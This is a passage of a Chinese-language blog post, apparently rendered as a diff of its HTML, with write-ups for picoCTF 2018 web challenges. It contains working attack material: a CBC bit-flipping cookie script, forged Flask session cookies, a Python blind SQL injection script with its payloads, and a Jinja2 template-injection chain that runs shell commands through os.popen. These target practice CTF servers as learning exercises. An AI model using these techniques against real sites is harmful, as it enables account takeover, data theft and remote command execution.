class="line">    admin = ord(raw[i])^ord(&quot;0&quot;)^ord(&quot;1&quot;)</span><br><span class="line">    new_raw = raw[:i]+chr(admin)+raw[i+1:]</span><br><span class="line">    new_cookie = base64.b64encode(new_raw+v[16:])</span><br><span class="line">    print new_cookie</span><br><span class="line">    cookie_new = &#123;&apos;cookie&apos;: new_cookie&#125;</span><br><span class="line">    http = requests.get(url,cookies=cookie_new)</span><br><span class="line">    print http.content</span><br><span class="line">    time.sleep(3)</span><br></pre></td></tr></table></figure>
+<p>这里不是很确定要改的位置在哪，于是先尝试把第一份加密的给翻转看看</p>
+<p><img src="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/9997eb5d763a6c241410725848f930ee.png" alt=""></p>
+<p>在第十一个字符处得到flag</p>
+<h2 id="Flaskcards-Skeleton-Key"><a href="#Flaskcards-Skeleton-Key" class="headerlink" title="Flaskcards Skeleton Key"></a>Flaskcards Skeleton Key</h2><p>又是一个flask的题，提示了Secret_Key</p>
+<p>查一下得知时用来加密session用的密钥，具体的加密方式可以看这:<a href="https://www.anquanke.com/post/id/163975" target="_blank" rel="noopener">从HCTF两道Web题谈谈flask客户端session机制</a></p>
+<p>不太会用flask这个模块于是找了大佬的脚本来用 <a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">flask-session-cookie-manager</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 session_cookie_manager.py decode -c &quot;.eJwlj1GqAjEMAO_Sbz-atGkSL7M0TYIiKOzq1-Pd3QUPMMPMX9lyj-NWru_9E5ey3b1cSwS2yUzedJpVpFiuntO8gvtIbaKGmD2qqLYAFSTN1cdMkJlZbWgScDAZCUwZjQWNI8OwgVNmiFEd0mRlr97ZgDiqcQfDcinr2HN7vx7xPHt8xJAEOKE2ZmPva6FqX-SzYx2--FSzn9zniP030cv_FzvlQBQ.D0GgCg.VBqx4_6AB25d4XZCiBbQD5xnXLM&quot; -s &quot;a7a8342f9b41fcb062b13dd1167785f8&quot;</span><br><span class="line">&#123;&apos;_fresh&apos;: True, &apos;_id&apos;: &apos;ee23a775d39abb025ecd9dfabd01dd6f9389b22f4e08993e198259fc46af18aff0b69f517e75b581a863782b7efeb231d5ffe8b506838cf40d47b157e0b741b2&apos;, &apos;csrf_token&apos;: &apos;d6e68f11fe836a37d4cc2994c5da4206dc77ef7d&apos;, &apos;user_id&apos;: &apos;4&apos;&#125;</span><br></pre></td></tr></table></figure>
+<p>解密后没有admin值，但有个user_id是一个数字，猜测是用户注册的顺序，于是修改成1加密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 session_cookie_manager.py encode -t &quot;&#123;&apos;_fresh&apos;: True, &apos;_id&apos;: &apos;ee23a775d39abb025ecd9dfabd01dd6f9389b22f4e08993e198259fc46af18aff0b69f517e75b581a863782b7efeb231d5ffe8b506838cf40d47b157e0b741b2&apos;, &apos;csrf_token&apos;: &apos;d6e68f11fe836a37d4cc2994c5da4206dc77ef7d&apos;, &apos;user_id&apos;: &apos;1&apos;&#125;&quot; -s &quot;a7a8342f9b41fcb062b13dd1167785f8&quot;</span><br><span class="line">.eJwlj1GqAjEMAO_Sbz-atGkSL7M0TYIiKOzq1-Pd3QUPMMPMX9lyj-NWru_9E5ey3b1cSwS2yUzedJpVpFiuntO8gvtIbaKGmD2qqLYAFSTN1cdMkJlZbWgScDAZCUwZjQWNI8OwgVNmiFEd0mRlr97ZgDiqcQfDcinr2HN7vx7xPHt8xJAEOKE2ZmPva6FqX-SzYx2--FSzn9zniP03AeX_CzvcQBE.XGAXyw.ytvd2GBqnDENvL2XOXWVQGZOC6c</span><br></pre></td></tr></table></figure>
+<p>提交，然后访问admin成功得到flag</p>
+<h2 id="Help-Me-Reset-2"><a href="#Help-Me-Reset-2" class="headerlink" title="Help Me Reset 2"></a>Help Me Reset 2</h2><p>点进去有修改密码页面以为是要二次注入，然而没发现注册页面<br>然后修改页面尝试了一堆用户名都不行，尝试各种注入不行</p>
+<p>最后回到主页F12发现一段注释着网站维护者，于是尝试一下成功进入到问题界面</p>
+<p>答案当然是不可能猜到的，抓个包看看发现和上题一样的加密，解密一下得到问题的答案</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 session_cookie_manager.py decode -c &quot;.eJw9jlEKg0AMRK8i-d4PsdCKV-gRWpG4Rl26bkp2VYp492Yp9CcThpeZHGBXEQoJGrDsWcDAm2N0vSdoHmBRFnyRujMJq4zMg8qPbQ2Im-bUWV5zRGlgjSTdgAmhOaBIOWMURyEfVXV9qcpbfS3BKPoh73lX3wmHYsGg692hTs99TJR_GXBz8RmgPQ3sik3_qvMLPSc8FQ.D0Gy1Q.g9xPDX5IEC_3C2cGc7gvL3gzZ_U&quot;</span><br><span class="line">b&apos;&#123;&quot;current&quot;:&quot;color&quot;,&quot;possible&quot;:[&quot;carmake&quot;,&quot;hero&quot;,&quot;food&quot;,&quot;color&quot;],&quot;right_count&quot;:0,&quot;user_data&quot;:&#123;&quot; t&quot;:[&quot;friend&quot;,&quot;2883207860&quot;,0,&quot;yellow&quot;,&quot;iron man&quot;,&quot;Kia&quot;,&quot;lobster&quot;,&quot;davis\\n&quot;]&#125;,&quot;wrong_count&quot;:0&#125;&apos;</span><br></pre></td></tr></table></figure>
+<p>当然顺序是不对的，认真分析一下然后成功修改密码登录得flag</p>
+<h2 id="A-Simple-Question"><a href="#A-Simple-Question" class="headerlink" title="A Simple Question"></a>A Simple Question</h2><p>F12后可以找到源码，读源码是个没有任何过滤的查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  	include &quot;config.php&quot;;</span><br><span class="line">  	ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">  	ini_set(&apos;display_errors&apos;, &apos;On&apos;);</span><br><span class="line"></span><br><span class="line">  	$answer = $_POST[&quot;answer&quot;];</span><br><span class="line">  	$debug = $_POST[&quot;debug&quot;];</span><br><span class="line">  	$query = &quot;SELECT * FROM answers WHERE answer=&apos;$answer&apos;&quot;;</span><br><span class="line">  	echo &quot;&lt;pre&quot;; echo &quot;SQL query: &quot;, htmlspecialchars($query), &quot;\n&quot;; echo &quot;&quot;; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;?php</span><br><span class="line">  	$con = new SQLite3($database_file);</span><br><span class="line">  	$result = $con-&gt;query($query); </span><br><span class="line">  	$row = $result-&gt;fetchArray(); </span><br><span class="line">  	if($answer == $CANARY) &#123; </span><br><span class="line">  		echo &quot;Perfect!&quot;; </span><br><span class="line">  		echo &quot;Your flag is: $FLAG&quot;; </span><br><span class="line">  	&#125; elseif ($row) &#123; </span><br><span class="line">  		echo &quot;You are so close.&quot;; </span><br><span class="line">  	&#125; else &#123; </span><br><span class="line">  		echo &quot;Wrong.&quot;; </span><br><span class="line">  	&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>CANARY这个变量估计在config.php里，访问config.php没东西，于是尝试sql注入</p>
+<p>可能是SQLite这个数据库没有database()这个函数，不过还好源码给了表名和列名，于是试试看盲注查这个列里的值<br>然而这个数据库里ascii()也没有，不过hex()有，然后写脚本发现总是出错。在浏览器那试了一下发现对比的hex()里要是字符，数字全会为wrong，明明本地的数据库可以直接数字对比的orz(就是要hex(‘4’)，不能hex(4))。那就不能二分查了，只能一个个顺序查</p>
+<p>上脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-  </span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = r&apos;http://2018shell.picoctf.com:2644/answer2.php&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line"></span><br><span class="line">	l1 = 0</span><br><span class="line">	r1 = 100</span><br><span class="line">	l2 = 0</span><br><span class="line">	r2 = 99</span><br><span class="line"></span><br><span class="line">	while(l1&lt;=r1):</span><br><span class="line">		mid1 = (l1 + r1)/2	</span><br><span class="line">		payload = &quot;-1&apos; or (select length(answer) from answers limit &quot;+str(i)+&quot;,1)=&quot;+str(mid1)+&quot; or &apos;&quot;</span><br><span class="line">		print payload</span><br><span class="line">		data = &#123;&apos;answer&apos;: payload,&apos;debug&apos;: 0&#125;</span><br><span class="line">		try:</span><br><span class="line">			http = requests.post(url,data=data,timeout=5)</span><br><span class="line">		except requests.exceptions.Timeout:</span><br><span class="line">			for p in range(1, 10):</span><br><span class="line">				print &quot;p&quot;+str(p)</span><br><span class="line">				try:</span><br><span class="line">					http = requests.post(url,data=data,timeout=5)</span><br><span class="line">					time.sleep(5)</span><br><span class="line">				except requests.exceptions.Timeout:</span><br><span class="line">							pass</span><br><span class="line">				if http.content:</span><br><span class="line">							break</span><br><span class="line">		time.sleep(1)</span><br><span class="line">		content = http.content</span><br><span class="line">		plain = re.findall(r&quot;&lt;h1&gt;(.*?)&lt;/h1&gt;&quot;,content)[0]</span><br><span class="line">		if(plain == &quot;You are so close.&quot;):</span><br><span class="line">			break</span><br><span class="line">		else:</span><br><span class="line">			payload = &quot;-1&apos; or (select length(answer) from answers limit &quot;+str(i)+&quot;,1)&gt;&quot;+str(mid1)+&quot; or &apos;&quot;</span><br><span class="line">			print payload</span><br><span class="line">			data = &#123;&apos;answer&apos;: payload,&apos;debug&apos;: 0&#125;</span><br><span class="line">			try:</span><br><span class="line">				http = requests.post(url,data=data,timeout=5)</span><br><span class="line">			except requests.exceptions.Timeout:</span><br><span class="line">				for p in range(1, 10):</span><br><span class="line">					print &quot;p&quot;+str(p)</span><br><span class="line">					http = requests.post(url,data=data,timeout=5)</span><br><span class="line">					time.sleep(5)</span><br><span class="line">			time.sleep(1)</span><br><span class="line">			content = http.content</span><br><span class="line">			plain = re.findall(r&quot;&lt;h1&gt;(.*?)&lt;/h1&gt;&quot;,content)[0]</span><br><span class="line">			if plain == &quot;You are so close.&quot;:</span><br><span class="line">				l1 = mid1 + 1</span><br><span class="line">			else:</span><br><span class="line">				r1 = mid1 - 1</span><br><span class="line"></span><br><span class="line">	if mid1==0:</span><br><span class="line">		break</span><br><span class="line">	print </span><br><span class="line">	print str(i)+&quot;:&quot;+str(mid1)</span><br><span class="line">	k = &apos;&apos;</span><br><span class="line"></span><br><span class="line">	for j in range(mid1):</span><br><span class="line">		for q in range(33,127):</span><br><span class="line">			if (q&gt;=48 and q&lt;=57) or (q&gt;=65 and q&lt;=90) or (q&gt;=97 and q&lt;=122):</span><br><span class="line">				payload = &quot;-1&apos; or substr((select answer from answers limit &quot;+str(i)+&quot;,1),&quot;+str(j+1)+&quot;,1)=&apos;&quot;+chr(q)+&quot;&apos; or &apos;&quot;</span><br><span class="line">				print payload</span><br><span class="line">				data = &#123;&apos;answer&apos;: payload,&apos;debug&apos;: 0&#125;</span><br><span class="line">				try:</span><br><span class="line">					http = requests.post(url,data=data,timeout=5)</span><br><span class="line">				except requests.exceptions.Timeout:</span><br><span class="line">					for p in range(1, 10):</span><br><span class="line">						print &quot;p&quot;+str(p)</span><br><span class="line">						try:</span><br><span class="line">							http = requests.post(url,data=data,timeout=5)</span><br><span class="line">							time.sleep(5)</span><br><span class="line">						except requests.exceptions.Timeout:</span><br><span class="line">							pass</span><br><span class="line">						if http.content:</span><br><span class="line">							break</span><br><span class="line">				time.sleep(1)</span><br><span class="line">				content = http.content</span><br><span class="line">				plain = re.findall(r&quot;&lt;h1&gt;(.*?)&lt;/h1&gt;&quot;,content)[0]</span><br><span class="line">				if plain == &quot;You are so close.&quot;:</span><br><span class="line">					break</span><br><span class="line"></span><br><span class="line">		print</span><br><span class="line">		k = k+chr(q)</span><br><span class="line">		print k</span><br><span class="line"></span><br><span class="line">	print</span><br></pre></td></tr></table></figure>
+<p>写得有点渣orz</p>
+<p>payload:<br><code>-1&#39; or (select length(answer) from answers limit 0,1)&gt;0 or &#39;</code><br><code>-1&#39; or substr((select answer from answers limit 0,1),1,1)=&#39;4&#39; or &#39;</code></p>
+<p>跑出就一个值41AndSixSixths，填入得flag</p>
+<h2 id="LambDash-3"><a href="#LambDash-3" class="headerlink" title="LambDash 3"></a>LambDash 3</h2><p>好像炸了</p>
+<h2 id="Flaskcards-and-Freedom"><a href="#Flaskcards-and-Freedom" class="headerlink" title="Flaskcards and Freedom"></a>Flaskcards and Freedom</h2><p>本来以为不能SSTI了，但试了一下可以，不过这次 <code>{ { config.item() } }</code> 就不能得到flag</p>
+<p>于是继续注入</p>
+<p><code></code> 得到 <code>(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</code><br><code></code> 得到 <code>&lt;class &#39;object&#39;&gt;</code><br><code>{ { &#39;&#39;.__class__.__mro__[-1].__subclasses__() } }</code> 得到一大堆继承类</p>
+<p>然后查一下能有os模块的类，然而没找到。不过除了os，我们还可以找sys模块的(因为sys中有os)。然后可以用popen()来执行命令，read()来读取结果</p>
+<p>我找到一个位置在591的类，于是</p>
+<p><code>{ { &#39;&#39;.__class__.__mro__[-1].__subclasses__()[591].__init__.__globals[&#39;sys&#39;]__.modules[&#39;os&#39;].popen(&#39;ls&#39;).read() } }</code> 得到 <code>app flag server.py xinet_startup.sh</code></p>
+<p>最后读取flag文件得flag</p>
+<p>payload:<br><code>{ { &#39;&#39;.__class__.__mro__[-1].__subclasses__()[591].__init__.__globals[&#39;sys&#39;]__.modules[&#39;os&#39;].popen(&#39;cat flag&#39;).read() } }</code></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/04/jarvisoj-web-wp/" rel="next" title="jarvisoj web wp">
+                <i class="fa fa-chevron-left"></i> jarvisoj web wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="shifeng_kaze">
+            
+              <p class="site-author-name" itemprop="name">shifeng_kaze</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Inspect-Me"><span class="nav-number">1.</span> <span class="nav-text">Inspect Me</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Logon"><span class="nav-number">2.</span> <span class="nav-text">Logon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Irish-Name-Repo"><span class="nav-number">3.</span> <span class="nav-text">Irish Name Repo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mr-Robots"><span class="nav-number">4.</span> <span class="nav-text">Mr. Robots</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Client-Side-is-Still-Bad"><span class="nav-number">5.</span> <span class="nav-text">Client Side is Still Bad</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-Login"><span class="nav-number">6.</span> <span class="nav-text">No Login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Secret-Agent"><span class="nav-number">7.</span> <span class="nav-text">Secret Agent</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Buttons"><span class="nav-number">8.</span> <span class="nav-text">Buttons</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Vault"><span class="nav-number">9.</span> <span class="nav-text">The Vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Artisinal-Handcrafted-HTTP-3"><span class="nav-number">10.</span> <span class="nav-text">Artisinal Handcrafted HTTP 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flaskcards"><span class="nav-number">11.</span> <span class="nav-text">Flaskcards</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fancy-alive-monitoring"><span class="nav-number">12.</span> <span class="nav-text">fancy-alive-monitoring</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Secure-Logon"><span class="nav-number">13.</span> <span class="nav-text">Secure Logon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flaskcards-Skeleton-Key"><span class="nav-number">14.</span> <span class="nav-text">Flaskcards Skeleton Key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Help-Me-Reset-2"><span class="nav-number">15.</span> <span class="nav-text">Help Me Reset 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#A-Simple-Question"><span class="nav-number">16.</span> <span class="nav-text">A Simple Question</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LambDash-3"><span class="nav-number">17.</span> <span class="nav-text">LambDash 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flaskcards-and-Freedom"><span class="nav-number">18.</span> <span class="nav-text">Flaskcards and Freedom</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shifeng_kaze</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
